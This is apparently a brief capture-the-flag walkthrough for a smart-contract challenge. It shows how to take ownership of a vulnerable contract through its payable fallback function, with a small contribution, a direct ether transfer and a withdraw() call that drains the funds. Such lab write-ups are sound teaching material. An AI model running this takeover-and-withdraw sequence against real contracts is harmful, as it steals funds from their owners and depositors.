The function without a name, `function() payable public`, is called a fallback function.
This function sets the message sender as the owner; we just need to make sure the required
conditions are fullfilled.

First, contribute a very small amount of ether:
'await contract.contribute({from: player, value:toWei(0.0009)})'

Then, activate the fallback function by just sending ether to the contract:
`sendTransaction({from: player, value: toWei(0.0009), to: instance, data: "0x99999999"})'



Now you are contract owner ,just withdraw all the contract's funds by using:
`contract.withdraw()`
